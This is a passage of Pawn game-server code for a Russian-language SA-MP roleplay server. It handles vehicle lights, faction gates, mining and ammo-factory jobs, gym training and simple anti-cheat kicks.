			GetVehicleParamsEx(GetPlayerVehicleID(playerid),engine,lights,alarm,doors,bonnet,boot,objective);
			SetVehicleParamsEx(GetPlayerVehicleID(playerid),VEHICLE_PARAMS_OFF,VEHICLE_PARAMS_OFF,alarm,doors,bonnet,boot,objective);
			Engine[GetPlayerVehicleID(playerid)] = false;
			Lights[GetPlayerVehicleID(playerid)] = false;
		}
		return true;
	}
	if(newkeys & KEY_ACTION)
	{
		if(PlayerLogged[playerid] == 0) return true;
		new cars = 0,temp = GetVehicleModel( GetPlayerVehicleID( playerid ) );
		for(new i; i != sizeof( BE_Bad_Vehs ); i++ )
		{
			if( temp == BE_Bad_Vehs[ i ] ) cars++;
		}
		if(cars > 0) return true;
		if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return true;
		if(PlayerInfo[playerid][pGunSkill][6] < NORM_SKILLS_PLAYER) return SendClientMessage(playerid, COLOR_GREY, PlayerLimiterMoreMFifty);
		if(VehRe[playerid] == true) VehRe[playerid] = false;
		else VehRe[playerid] = true;
		return true;
	}
	if(newkeys & KEY_CROUCH)
	{
		if(GetPlayerState(playerid) != 2) return true;
		new vehicleid = GetPlayerVehicleID(playerid);
		if(IsPlayerInRangeOfPoint(playerid, 3.0,2144.3237,1831.9427,1078.9501))
		{
			for(new i; i < MAX_PLAYERS; i++)
			{
				if(!IsPlayerConnected(i) || PlayerLogged[i] == 0) continue;
				if(IsPlayerInVehicle(i, vehicleid))
				{
					SetVehiclePos(vehicleid, 1550.8254,-1388.0455,13.7295);
					SetVehicleZAngle(vehicleid, 179.7317);
					PlayerInfo[ playerid ][ pPos_x ] = 1550.8254;
					PlayerInfo[ playerid ][ pPos_y ] = -1388.0455;
					PlayerInfo[ playerid ][ pPos_z ] = 13.7295;
					SetPVarInt(playerid, "AntiBreik", 3);
					SetVehicleVirtualWorld(vehicleid, 0);
					LinkVehicleToInterior(vehicleid,0);
					SetPlayerInterior(i, 0);
					SetPlayerVirtualWorld(i, 0);
				}
			}
		}
		if(IsPlayerInRangeOfPoint(playerid, 7.0,-2057.2344,-97.6487,35.1718))
		{
			if(GetPlayerState(playerid) != 2) return true;
			if(PlayerInfo[playerid][pMember] == F_LIC || GetPVarInt(playerid, "LicTest") > 0)
			{
				new Float:RotX, Float:RotY, Float:RotZ;
				GetObjectRot(Object[0], RotX, RotY, RotZ);
				if(RotY != -90) return true;
				MoveObject(Object[0], -2057.18994141,-101.19999695,34.90000153+0.004,0.004, 0.00000000,0.00000000,270.00000000);
				SetTimer("GateLic", 4000, 0);
				SendClientMessage(playerid, COLOR_BLUE, "Шлагбаум открыт на 7 секунд");
			}
		}
		if(IsPlayerInRangeOfPoint(playerid, 7.0,-1701.8092,683.8960,24.8906))
		{
			if(GetPlayerState(playerid) != 2) return true;
			if(IsACop(playerid) || PlayerInfo[playerid][pMember] == F_ARMY)
			{
				new Float:RotX, Float:RotY, Float:RotZ;
				GetObjectRot(Object[1], RotX, RotY, RotZ);
				if(RotY != 90) return true;
				MoveObject(Object[1], -1701.43395996,687.69000244,24.65999794+0.004,0.004, 0.00000000,0.00000000,270.00000000);
				SetTimer("GateSFO", 4000, 0);
				SendClientMessage(playerid, COLOR_BLUE, "Шлагбаум открыт на 7 секунд");
			}
		}
		if(IsPlayerInRangeOfPoint(playerid, 7.0,-1572.5665,662.4639,7.1875))
		{
			if(GetPlayerState(playerid) != 2) return true;
			if(IsACop(playerid) || PlayerInfo[playerid][pMember] == F_ARMY)
			{
				new Float:RotX, Float:RotY, Float:RotZ;
				GetObjectRot(Object[2], RotX, RotY, RotZ);
				if(RotY != 90) return true;
				MoveObject(Object[2], -1572.18994141,658.70001221,6.89099789+0.004,0.004, 0.00000000,0.00000000,90.00000000);
				SetTimer("GateSFT", 4000, 0);
				SendClientMessage(playerid, COLOR_BLUE, "Шлагбаум открыт на 7 секунд");
			}
		}
		if(IsPlayerInRangeOfPoint(playerid, 7.0,1545.0767,-1626.9976,13.3828))
		{
			if(GetPlayerState(playerid) != 2) return true;
			if(IsACop(playerid) || PlayerInfo[playerid][pMember] == F_ARMY)
			{
				new Float:RotX, Float:RotY, Float:RotZ;
				GetObjectRot(Object[3], RotX, RotY, RotZ);
				if(RotY != 90) return true;
				MoveObject(Object[3], 1544.69006348,-1630.90002441,13.13999939+0.004,0.004, 0.00000000,0.00000000,90.00000000);
				SetTimer("GateLS", 4000, 0);
				SendClientMessage(playerid, COLOR_BLUE, "Шлагбаум открыт на 7 секунд");
			}
		}
		if(IsPlayerInRangeOfPoint(playerid, 7.0,2238.5742,2454.0466,10.8203))
		{
			if(GetPlayerState(playerid) != 2) return true;
			if(IsACop(playerid) || PlayerInfo[playerid][pMember] == F_ARMY)
			{
				new Float:RotX, Float:RotY, Float:RotZ;
				GetObjectRot(Object[4], RotX, RotY, RotZ);
				if(RotY != 90) return true;
				MoveObject(Object[4], 2238.19995117,2450.29980469,10.65000057+0.004,0.004, 0.00000000,0.00000000,90.00000000);
				SetTimer("GateLV", 4000, 0);
				SendClientMessage(playerid, COLOR_BLUE, "Шлагбаум открыт на 7 секунд");
			}
		}
		if(IsPlayerInRangeOfPoint(playerid, 12.0,286.0616,1821.0507,17.2128))
		{
			if(GetPlayerState(playerid) != 2) return true;
			if(PlayerInfo[playerid][pMember] == F_ARMY)
			{
				MoveObject(vorota,285.62500000,1811.20446777,18.36432266,3.0,0.00000000,0.00000000,270.00000000);
				MoveObject(vorota2,285.62500000,1830.82177734,18.27965546,3.0,0.00000000,0.00000000,270.00000000);
				SetTimer("GatePex", 4000, 0);
				SendMes(playerid, COLOR_BLUE, "Ворота открыты на 7 секунд.");
			}
		}
		if(IsPlayerInRangeOfPoint(playerid, 12.0,-1946.0976,-1015.3544,35.0999))
		{
			if(GetPlayerState(playerid) != 2) return true;
			if(PlayerInfo[playerid][pMember] == F_FBI)
			{
				MoveObject(vorota3,-1946.0980, -1015.3549, 40.5,3.0,0.00000000,0.00000000,0.00000000);
				SetTimer("GateFBI", 5000, 0);
				SendMes(playerid, COLOR_BLUE, "Ворота открыты на 7 секунд.");
			}
		}
		if(IsPlayerInRangeOfPoint(playerid, 7.0,-1048.5369,-1328.7428,129.5853))
		{
			if(GetPlayerState(playerid) != 2) return true;
			if(IsAGang(playerid) || IsAMafia(playerid))
			{
				new Float:X, Float:Y, Float:Z;
				GetObjectPos(Object[7], X, Y, Z);
				if(X != -1044.65002441) return true;
				MoveObject(Object[7], -1038.65002441,-1328.19921875,130.300003050,3.0, 0.00000000,0.00000000,0.00000000);
				MoveObject(Object[8], -1058.59997559,-1328.19921875,130.30000305,3.0, 0.00000000,0.00000000,0.00000000);
				SetTimer("GateFSF", 4000, 0);
				SendClientMessage(playerid, COLOR_BLUE, "Ворота открыты на 7 секунд");
			}
		}
		return true;
	}
	if(newkeys == KEY_FIRE && Ruda[playerid] >= 1 && Samorodok[playerid] == 1 || KEY_SPRINT && Ruda[playerid] >= 1 && Samorodok[playerid] == 1)
	{
		if(!IsPlayerInRangeOfPoint(playerid, 3, -434.8102,1423.3257,19.9430)
		&& !IsPlayerInRangeOfPoint(playerid, 3, -428.0896,1405.5256,17.5466)
		&& !IsPlayerInRangeOfPoint(playerid, 3, -421.4283,1373.2676,13.3447)
		&& !IsPlayerInRangeOfPoint(playerid, 3, -411.1367,1343.4590,13.1652)
		&& !IsPlayerInRangeOfPoint(playerid, 3, -410.2596,1331.2748,12.8897)
		&& !IsPlayerInRangeOfPoint(playerid, 3, -395.5334,1269.1738,7.4334))
		{
			SendClientMessage(playerid,0xFFAA00FF, "Вы сломали тележку!");
	   		DisablePlayerCheckpoint(playerid);
	     	ApplyAnimation(playerid, "CARRY", "crry_prtial", 4.0, 0, 0, 0, 0, 1);
			Ruda[playerid] = 0;
			Samorodok[playerid] = 0;
			CP[playerid] = 0;
   			RemovePlayerAttachedObject(playerid, 2);
   			RemovePlayerAttachedObject(playerid, 3);
   			SetPlayerAttachedObject(playerid, 3, 18634, 6, 0.078222, 0.000000, 0.110844, 298.897308, 264.126861, 193.350555, 1.000000, 1.000000, 1.000000);
  		}
		return 1;
	}
	if(!IsPlayerInAnyVehicle(playerid))
	{
		if(newkeys & KEY_FIRE || newkeys == 145 && oldkeys == 129 || (oldkeys & 128 && newkeys & 16) && GetPVarInt(playerid, "TimeDM") == 0)
		{
			if(IsAnDMZone(playerid))
			{
				ApplyAnimation(playerid,"FAT","IDLE_tired",4.1,1,0,0,0,0,1);
				SetPVarInt(playerid, "TimeDM", 6);
			}
		}
		if((oldkeys & 128 && newkeys & 16))
		{
			if(IsPlayerInRangeOfPoint(playerid, 4.0,773.770,-62.312,1000.7184))
			{
				if(pSportZal[playerid] != 1) return SendClientMessage(playerid,COLOR_WHITE,"Вы не переоделись!");
				switch(random(3))
				{
				case 1:
					{
						switch(random(3))
						{
						case 0: PlayerPlaySound(playerid, 17805, 0.0, 0.0, 0.0);
						case 1: PlayerPlaySound(playerid, 17806, 0.0, 0.0, 0.0);
						}
						PlayerInfo[playerid][pSportEXP]++;
						format(string,16,"%d",PlayerInfo[playerid][pSportEXP]);
						GameTextForPlayer(playerid,string,500,6);
						if(PlayerInfo[playerid][pSportEXP] == 5000)
						{
							SendClientMessage(playerid,COLOR_WHITE,"Вы выучили новый стиль боя 1000 ударов, используйте /fstyle [1]");
							PlayerInfo[playerid][pFightStyle]=5;
							SendClientMessage(playerid,COLOR_WHITE,"Осталось открыть 2 стиля боя, требуется еще 4000 ударов");
						}
						if(PlayerInfo[playerid][pSportEXP] == 10000)
						{
							SendClientMessage(playerid,COLOR_WHITE,"Вы выучили новый стиль боя 5000 ударов, используйте /fstyle [2]");
							PlayerInfo[playerid][pFightStyle]=6;
							SendClientMessage(playerid,COLOR_WHITE,"Осталось открыть 1 стиль боя, требуется еще 10000 ударов");
						}
						if(PlayerInfo[playerid][pSportEXP] == 15000)
						{
							SendClientMessage(playerid,COLOR_WHITE,"Вы выучили новый стиль боя 15000 ударов , используйте /fstyle [3]");
							PlayerInfo[playerid][pFightStyle]=7;
							SendClientMessage(playerid,COLOR_WHITE,"Вы выучили все стили боя! Поздравляем!");
						}
					}
				}
			}
		}
	}
	else
	{
		if(newkeys & KEY_FIRE)
		{
			if(PlayerLogged[playerid] == 0) return true;
			new cars = 0,temp = GetVehicleModel( GetPlayerVehicleID( playerid ) );
			for(new i; i != sizeof( BE_Bad_Vehs ); i++ )
			{
				if( temp == BE_Bad_Vehs[ i ] ) cars++;
			}
			if(cars > 0) return true;
			if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return true;
			if(Engine[GetPlayerVehicleID(playerid)] == false) return SendClientMessage(playerid, COLOR_GREY, ""NeedToStartEngine"");
			if(Lights[GetPlayerVehicleID(playerid)] == false)
			{
				GetVehicleParamsEx(GetPlayerVehicleID(playerid),engine,lights,alarm,doors,bonnet,boot,objective);
				SetVehicleParamsEx(GetPlayerVehicleID(playerid),engine,VEHICLE_PARAMS_ON,alarm,doors,bonnet,boot,objective);
				Lights[GetPlayerVehicleID(playerid)] = true;
			}
			else
			{
				GetVehicleParamsEx(GetPlayerVehicleID(playerid),engine,lights,alarm,doors,bonnet,boot,objective);
				SetVehicleParamsEx(GetPlayerVehicleID(playerid),engine,VEHICLE_PARAMS_OFF,alarm,doors,bonnet,boot,objective);
				Lights[GetPlayerVehicleID(playerid)] = false;
			}
			return true;
		}
	}
	return true;
}
//==============================================================================
public OnPlayerUpdate(playerid)
{
    if(GetPVarInt(playerid, "Kick") != 0) GKick(playerid);
    if(rendlodk[playerid] == 1)
	{
	  if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT)
	  {
        new Float:cx, Float:cy, Float:cz;
        GetVehiclePos(vehiclek[playerid], cx, cy, cz);
      //  SendMes(playerid, COLOR_LIGHTRED, "Расстояние до тачки: %f,%f,%f",DistanceVehicle[0]-DistanceVehicle[3],DistanceVehicle[1]-DistanceVehicle[4],DistanceVehicle[2]-DistanceVehicle[5]);
	    if(PlayerToPoint(40.0, playerid, cx, cy, cz))
	    {
	      DestroyVehicle(vehiclek[playerid]);
	      vehiclek[playerid] = 0;
	      SendClientMessage(playerid,COLOR_WHITE,"Ваша арендованая машина удалена");
	      rendlodk[playerid] = 0;
	    }
	  }
	}
	new animlib[30], animname[30];
	SetPVarInt(playerid,"AFK_Tick", GetPVarInt(playerid,"AFK_Tick") + 1);
	if(!IsPlayerInAnyVehicle(playerid) && PlayerInfo[playerid][pAdmin] == 0)
	{
		GetAnimationName(GetPlayerAnimationIndex(playerid), animlib, sizeof(animlib), animname, sizeof(animname));//проверка на анимацию
		new Float:posx, Float:posy, Float:posz;//переменные
		GetPlayerPos(playerid, posx, posy, posz);//проверка на координаты
		if(posz >= 2 && posz <= 300)//Если posz равен либо больше 2 метров и меньше 500
		{
			if(strcmp(animlib, "SWIM", true) == 0 && strcmp(animname, "SWIM_crawl", true) == 0)//проверяем на анимацию, если все верно то....
			{
				KickEx(playerid,2312);//кикаем игрока
			}
		}
	}
		//----------------------------------------------------------
	if(Ruda[playerid] >= 1 && Samorodok[playerid] == 1)
	{
	    if(IsPlayerApplyAnimation(playerid, "FALL_back")
		|| IsPlayerApplyAnimation(playerid, "FALL_collapse")
		|| IsPlayerApplyAnimation(playerid, "FALL_fall")
		|| IsPlayerApplyAnimation(playerid, "FALL_front")
		|| IsPlayerApplyAnimation(playerid, "FALL_glide")
		|| IsPlayerApplyAnimation(playerid, "FALL_land")
		|| IsPlayerApplyAnimation(playerid, "FALL_skyDive")
		|| IsPlayerApplyAnimation(playerid, "JUMP_glide")
		|| IsPlayerApplyAnimation(playerid, "JUMP_land")
		|| IsPlayerApplyAnimation(playerid, "JUMP_launch")
		|| IsPlayerApplyAnimation(playerid, "JUMP_launch_R"))
	    {
			if(!IsPlayerInRangeOfPoint(playerid, 3, -434.8102,1423.3257,19.9430)
			&& !IsPlayerInRangeOfPoint(playerid, 3, -428.0896,1405.5256,17.5466)
			&& !IsPlayerInRangeOfPoint(playerid, 3, -421.4283,1373.2676,13.3447)
			&& !IsPlayerInRangeOfPoint(playerid, 3, -411.1367,1343.4590,13.1652)
			&& !IsPlayerInRangeOfPoint(playerid, 3, -410.2596,1331.2748,12.8897)
			&& !IsPlayerInRangeOfPoint(playerid, 3, -395.5334,1269.1738,7.4334))
			{
				SendClientMessage(playerid, 0xFFAA00FF, "Вы сломали тележку!");
			    DisablePlayerCheckpoint(playerid);
				ApplyAnimation(playerid, "CARRY", "crry_prtial", 4.0, 0, 0, 0, 0, 1);
				Ruda[playerid] = 0;
				Samorodok[playerid] = 0;
				CP[playerid] = 0;
			    RemovePlayerAttachedObject(playerid, 2);
			    RemovePlayerAttachedObject(playerid, 3);
			    SetPlayerAttachedObject(playerid, 3, 18634, 6, 0.078222, 0.000000, 0.110844, 298.897308, 264.126861, 193.350555, 1.000000, 1.000000, 1.000000);
			    return 1;
			}
	    }
	}
	////////
    if(pPatr[playerid] == 1)
	{
	    if(IsPlayerApplyAnimation(playerid, "FALL_back")
		|| IsPlayerApplyAnimation(playerid, "FALL_collapse")
		|| IsPlayerApplyAnimation(playerid, "FALL_fall")
		|| IsPlayerApplyAnimation(playerid, "FALL_front")
		|| IsPlayerApplyAnimation(playerid, "FALL_glide")
		|| IsPlayerApplyAnimation(playerid, "FALL_land")
		|| IsPlayerApplyAnimation(playerid, "FALL_skyDive")
		|| IsPlayerApplyAnimation(playerid, "JUMP_glide")
		|| IsPlayerApplyAnimation(playerid, "JUMP_land")
		|| IsPlayerApplyAnimation(playerid, "JUMP_launch")
		|| IsPlayerApplyAnimation(playerid, "JUMP_launch_R"))
	    {
			if(!IsPlayerInRangeOfPoint(playerid, 3, 2559.0730,-1300.0951,1044.1250)
			&& !IsPlayerInRangeOfPoint(playerid, 3, 2551.0469,-1300.0946,1044.1250)
			&& !IsPlayerInRangeOfPoint(playerid, 3, 2543.0508,-1300.0941,1044.1250)
			&& !IsPlayerInRangeOfPoint(playerid, 3, 2543.2144,-1287.2175,1044.1250)
			&& !IsPlayerInRangeOfPoint(playerid, 3, 2551.2034,-1287.2174,1044.1250)
			&& !IsPlayerInRangeOfPoint(playerid, 3, 2559.1350,-1287.2178,1044.1250))
			{
				SendClientMessage(playerid, 0xFFAA00FF, "Вы уронили ящик с патронами!");
				SendClientMessage(playerid, 0xFFAA00FF, "Чтобы поднять ящик /takefp");
				ApplyAnimation(playerid, "CARRY", "crry_prtial", 4.0, 0, 0, 0, 0, 1);
				Gotovbox[playerid] = 0;
				pObdelbox[playerid] = 0;
				pBoxobdel[playerid] = 0;
				pMet[playerid] = 0;
				pPatr[playerid] = 0;
				DisablePlayerCheckpoint(playerid);
			    RemovePlayerAttachedObject(playerid, 4);
    			CP[playerid] = 4;
				SetPlayerCheckpoint(playerid,2564.7886,-1292.9933,1044.1250,2.0);
			    return 1;
			}
	    }
	}
    if(Zavod[playerid] == 1 && pMet[playerid] == 1 && pBoxobdel[playerid] == 0)
    {
  		if(IsPlayerInRangeOfPoint(playerid, 0.5, 2558.4895,-1295.8501,1044.1250))
		{
 			TogglePlayerControllable(playerid,false);
			SetTimerEx("Stol1", 6000, false, "i", playerid);
			pBoxobdel[playerid] = 1;
			Objectbox[playerid] = CreateObject(2043,2558.48608398,-1294.88403320,1044.18103027,0.00000000,0.00000000,0.00000000); //object(ammo_box_m4) (1)
			ApplyAnimation(playerid,"BD_FIRE","Playa_Kiss_03",4.1,0,1,1,1,1);
		}
		if(IsPlayerInRangeOfPoint(playerid, 0.5, 2556.1165,-1295.8502,1044.1250))
		{
		 	TogglePlayerControllable(playerid,false);
			SetTimerEx("Stol2", 6000, false, "i", playerid);
			pBoxobdel[playerid] = 1;
			Objectbox[playerid] = CreateObject(2043,2556.14208984,-1294.87805176,1044.18103027,0.00000000,0.00000000,0.00000000); //object(ammo_box_m4) (2)
			ApplyAnimation(playerid,"BD_FIRE","Playa_Kiss_03",4.1,0,1,1,1,1);
		}
		if(IsPlayerInRangeOfPoint(playerid, 0.5, 2553.8774,-1295.8499,1044.1250))
		{
			TogglePlayerControllable(playerid,false);
			SetTimerEx("Stol3", 6000, false, "i", playerid);
			pBoxobdel[playerid] = 1;
			Objectbox[playerid] = CreateObject(2043,2553.76904297,-1294.94702148,1044.18103027,0.00000000,0.00000000,0.00000000); //object(ammo_box_m4) (3)
		    ApplyAnimation(playerid,"BD_FIRE","Playa_Kiss_03",4.1,0,1,1,1,1);
		}
		if(IsPlayerInRangeOfPoint(playerid, 0.5, 2544.2654,-1295.8499,1044.1250))
		{
			TogglePlayerControllable(playerid,false);
			SetTimerEx("Stol4", 6000, false, "i", playerid);
			pBoxobdel[playerid] = 1;
			Objectbox[playerid] = CreateObject(2043,2544.38110352,-1294.91601562,1044.18103027,0.00000000,0.00000000,0.00000000); //object(ammo_box_m4) (4)
			ApplyAnimation(playerid,"BD_FIRE","Playa_Kiss_03",4.1,0,1,1,1,1);
		}
		if(IsPlayerInRangeOfPoint(playerid, 0.5, 2542.0413,-1295.8497,1044.1250))
		{
			TogglePlayerControllable(playerid,false);
			SetTimerEx("Stol5", 6000, false, "i", playerid);
			pBoxobdel[playerid] = 1;
			Objectbox[playerid] = CreateObject(2043,2541.90795898,-1294.93798828,1044.18103027,0.00000000,0.00000000,0.00000000); //object(ammo_box_m4) (5)
			ApplyAnimation(playerid,"BD_FIRE","Playa_Kiss_03",4.1,0,1,1,1,1);
		}
		if(IsPlayerInRangeOfPoint(playerid, 0.5, 2541.9165,-1291.0054,1044.1250))
		{
			TogglePlayerControllable(playerid,false);
			SetTimerEx("Stol6", 6000, false, "i", playerid);
			pBoxobdel[playerid] = 1;
			Objectbox[playerid] = CreateObject(2043,2542.00292969,-1291.87805176,1044.18103027,0.00000000,0.00000000,179.00000000); //object(ammo_box_m4) (6)
			ApplyAnimation(playerid,"BD_FIRE","Playa_Kiss_03",4.1,0,1,1,1,1);
		}
		if(IsPlayerInRangeOfPoint(playerid, 0.5, 2544.4456,-1291.0055,1044.1250))
		{
			TogglePlayerControllable(playerid,false);
			SetTimerEx("Stol7", 6000, false, "i", playerid);
			pBoxobdel[playerid] = 1;
			Objectbox[playerid] = CreateObject(2043,2544.37988281,-1291.83703613,1044.18103027,0.00000000,0.00000000,178.99475098); //object(ammo_box_m4) (7)
			ApplyAnimation(playerid,"BD_FIRE","Playa_Kiss_03",4.1,0,1,1,1,1);
		}
		if(IsPlayerInRangeOfPoint(playerid, 0.5, 2553.8711,-1291.0055,1044.1250))
		{
			TogglePlayerControllable(playerid,false);
			SetTimerEx("Stol8", 6000, false, "i", playerid);
			pBoxobdel[playerid] = 1;
			Objectbox[playerid] = CreateObject(2043,2553.85107422,-1291.95300293,1044.18103027,0.00000000,0.00000000,178.99475098); //object(ammo_box_m4) (8)
			ApplyAnimation(playerid,"BD_FIRE","Playa_Kiss_03",4.1,0,1,1,1,1);
		}
		if(IsPlayerInRangeOfPoint(playerid, 0.5, 2556.3494,-1291.0048,1044.1250))
		{
			TogglePlayerControllable(playerid,false);
			SetTimerEx("Stol9", 6000, false, "i", playerid);
			pBoxobdel[playerid] = 1;
			Objectbox[playerid] = CreateObject(2043,2556.22094727,-1291.93994141,1044.18103027,0.00000000,0.00000000,178.99475098); //object(ammo_box_m4) (9)
			ApplyAnimation(playerid,"BD_FIRE","Playa_Kiss_03",4.1,0,1,1,1,1);
		}
		if(IsPlayerInRangeOfPoint(playerid, 0.5, 2558.6387,-1291.0056,1044.1250))
		{
			TogglePlayerControllable(playerid,false);
			SetTimerEx("Stol10", 6000, false, "i", playerid);
			pBoxobdel[playerid] = 1;
			Objectbox[playerid] = CreateObject(2043,2558.60107422,-1291.87097168,1044.18103027,0.00000000,0.00000000,178.99475098); //object(ammo_box_m4) (10)
			ApplyAnimation(playerid,"BD_FIRE","Playa_Kiss_03",4.1,0,1,1,1,1);
		}
	}
	if(pObdelbox[playerid] == 1)
	{
	    if(IsPlayerApplyAnimation(playerid, "FALL_back")
		|| IsPlayerApplyAnimation(playerid, "FALL_collapse")
		|| IsPlayerApplyAnimation(playerid, "FALL_fall")
		|| IsPlayerApplyAnimation(playerid, "FALL_front")
		|| IsPlayerApplyAnimation(playerid, "FALL_glide")
		|| IsPlayerApplyAnimation(playerid, "FALL_land")
		|| IsPlayerApplyAnimation(playerid, "FALL_skyDive")
		|| IsPlayerApplyAnimation(playerid, "JUMP_glide")
		|| IsPlayerApplyAnimation(playerid, "JUMP_land")
		|| IsPlayerApplyAnimation(playerid, "JUMP_launch")
		|| IsPlayerApplyAnimation(playerid, "JUMP_launch_R"))
	    {
			if(!IsPlayerInRangeOfPoint(playerid, 3, 2558.4895,-1295.8501,1044.1250)
			&& !IsPlayerInRangeOfPoint(playerid, 3, 2556.1165,-1295.8502,1044.1250)
			&& !IsPlayerInRangeOfPoint(playerid, 3, 2553.8774,-1295.8499,1044.1250)
			&& !IsPlayerInRangeOfPoint(playerid, 3, 2544.2654,-1295.8499,1044.1250)
			&& !IsPlayerInRangeOfPoint(playerid, 3, 2542.0413,-1295.8497,1044.1250)
			&& !IsPlayerInRangeOfPoint(playerid, 3, 2541.9165,-1291.0054,1044.1250)
			&& !IsPlayerInRangeOfPoint(playerid, 3, 2544.4456,-1291.0055,1044.1250)
			&& !IsPlayerInRangeOfPoint(playerid, 3, 2553.8711,-1291.0055,1044.1250)
			&& !IsPlayerInRangeOfPoint(playerid, 3, 2556.3494,-1291.0048,1044.1250)
			&& !IsPlayerInRangeOfPoint(playerid, 3, 2558.6387,-1291.0056,1044.1250))
			{
				SendClientMessage(playerid, 0xFFAA00FF, "Вы уронили коробку!");
				ApplyAnimation(playerid, "CARRY", "crry_prtial", 4.0, 0, 0, 0, 0, 1);
				Gotovbox[playerid] = 0;
				pObdelbox[playerid] = 0;
				pBoxobdel[playerid] = 0;
				pMet[playerid] = 0;
			    RemovePlayerAttachedObject(playerid, 4);
    			CP[playerid] = 4;
				SetPlayerCheckpoint(playerid,2564.7886,-1292.9933,1044.1250,2.0);
			    return 1;
			}
	    }
	}
    if(Zavod[playerid] == 1 && pObdelbox[playerid] == 1 && pBoxobdel[playerid] == 1 && Gotovbox[playerid] == 0)
    {
  		if(IsPlayerInRangeOfPoint(playerid, 0.5, 2559.0730,-1300.0951,1044.1250))
		{
 			TogglePlayerControllable(playerid,false);
		    RemovePlayerAttachedObject(playerid, 4);
			SetTimerEx("Verstak1", 3000, false, "i", playerid);
			Gotovbox[playerid] = 1;
			Objectbox[playerid] = CreateObject(1356,2559.06103516,-1300.96398926,1044.20703125,0.00000000,0.00000000,0.00000000); //object(cj_fruitcrate2) (1)
			ApplyAnimation(playerid,"CASINO","Roulette_bet",4.1,0,1,1,1,1);
		}
		if(IsPlayerInRangeOfPoint(playerid, 0.5, 2551.0469,-1300.0946,1044.1250))
		{
 			TogglePlayerControllable(playerid,false);
		    RemovePlayerAttachedObject(playerid, 4);
		    Objectbox[playerid] = CreateObject(1356,2551.08789062,-1300.94995117,1044.20703125,0.00000000,0.00000000,0.00000000); //object(cj_fruitcrate2) (2)
			SetTimerEx("Verstak2", 3000, false, "i", playerid);
			Gotovbox[playerid] = 1;
			ApplyAnimation(playerid,"CASINO","Roulette_bet",4.1,0,1,1,1,1);
		}
		if(IsPlayerInRangeOfPoint(playerid, 0.5, 2543.0508,-1300.0941,1044.1250))
		{
 			TogglePlayerControllable(playerid,false);
			RemovePlayerAttachedObject(playerid, 4);
			Objectbox[playerid] = CreateObject(1356,2543.04492188,-1300.93298340,1044.20703125,0.00000000,0.00000000,0.00000000); //object(cj_fruitcrate2) (3)
			SetTimerEx("Verstak3", 3000, false, "i", playerid);
			Gotovbox[playerid] = 1;
			ApplyAnimation(playerid,"CASINO","Roulette_bet",4.1,0,1,1,1,1);
		}
		if(IsPlayerInRangeOfPoint(playerid, 0.5, 2543.2144,-1287.2175,1044.1250))
		{
 			TogglePlayerControllable(playerid,false);
			RemovePlayerAttachedObject(playerid, 4);
			Objectbox[playerid] = CreateObject(1356,2543.08496094,-1286.40698242,1044.20703125,0.00000000,0.00000000,0.00000000); //object(cj_fruitcrate2) (4)
			SetTimerEx("Verstak4", 3000, false, "i", playerid);
			Gotovbox[playerid] = 1;
			ApplyAnimation(playerid,"CASINO","Roulette_bet",4.1,0,1,1,1,1);
		}
		if(IsPlayerInRangeOfPoint(playerid, 0.5, 2551.2034,-1287.2174,1044.1250))
		{
 			TogglePlayerControllable(playerid,false);
			RemovePlayerAttachedObject(playerid, 4);
			Objectbox[playerid] = CreateObject(1356,2551.07910156,-1286.38098145,1044.20703125,0.00000000,0.00000000,0.00000000); //object(cj_fruitcrate2) (5)
			SetTimerEx("Verstak5", 3000, false, "i", playerid);
			Gotovbox[playerid] = 1;
			ApplyAnimation(playerid,"CASINO","Roulette_bet",4.1,0,1,1,1,1);
		}
		if(IsPlayerInRangeOfPoint(playerid, 0.5, 2559.1350,-1287.2178,1044.1250))
		{
 			TogglePlayerControllable(playerid,false);
			RemovePlayerAttachedObject(playerid, 4);
			Objectbox[playerid] = CreateObject(1356,2559.07690430,-1286.35498047,1044.20703125,0.00000000,0.00000000,0.00000000); //object(cj_fruitcrate2) (6)
			SetTimerEx("Verstak6", 3000, false, "i", playerid);
			Gotovbox[playerid] = 1;
			ApplyAnimation(playerid,"CASINO","Roulette_bet",4.1,0,1,1,1,1);
		}
	}
	//----------------------------------------------------------
	if(Meshok[playerid] == 1 && !PlayerToPoint(5.0,playerid,2832.8132324219,-2496.7043457031,14.16))
	{
		GetAnimationName(GetPlayerAnimationIndex(playerid),animlib,32,animname,32);
		if(strcmp(animname, "IDLE_STANCE", true) != 0 && strcmp(animname, "RUN_CIVI", true) != 0 && strcmp(animname, "WALK_CIVI", true) != 0 && strcmp(animname, "crry_prtial", true) != 0 && strcmp(animname, "SPRINT_PANIC", true) != 0 && strcmp(animname, "RUN_PLAYER", true) != 0 && strcmp(animname, "WALK_PLAYER", true) != 0 && strcmp(animname, "SPRINT_CIVI", true) != 0)
		{
			Meshok[playerid] = 0;
			SendClientMessage(playerid, COLOR_RED, "Вы уронили ящик!");
			if(IsPlayerAttachedObjectSlotUsed(playerid,2)) RemovePlayerAttachedObject(playerid,2);
			ApplyAnimation(playerid,"PED","IDLE_tired",4.1,0,1,1,0,1);
			SetPlayerCheckpoint(playerid,2833.0859,-2496.3464,14.6081,1.5);
			SetPVarInt(playerid,"pGruz", 1);
			KillTimer(AnimTimer[playerid]);
		}
	}
	if((GetPlayerState(playerid) == PLAYER_STATE_SPECTATING) && PlayerInfo[playerid][pAdmin] < 1)
	{
		return KickEx(playerid,331);
	}
	if(InShop[playerid] > 0) SelectCar(playerid);
	if(MatsFactTime[playerid] > 0 && MatsFactTime[playerid] < 14) SelectMats(playerid);
	GetAnimationName(GetPlayerAnimationIndex(playerid),animlib,32,animname,32);
	SetPVarInt(playerid, "NewPlayerAmmo", GetPlayerAmmo(playerid));
	if(GetPVarInt(playerid, "NewPlayerAmmo") != GetPVarInt(playerid, "PlayerAmmo"))
	{
		OnPlayerAmmoChange(playerid, GetPVarInt(playerid, "NewPlayerAmmo"), GetPVarInt(playerid, "PlayerAmmo"));
		SetPVarInt(playerid, "PlayerAmmo", GetPVarInt(playerid, "NewPlayerAmmo"));
	}
	if(_Factory[playerid] > 0)
	{
		GetAnimationName(GetPlayerAnimationIndex(playerid),animlib,32,animname,32);
		if(GetPlayerSkin(playerid) == 287)
		{
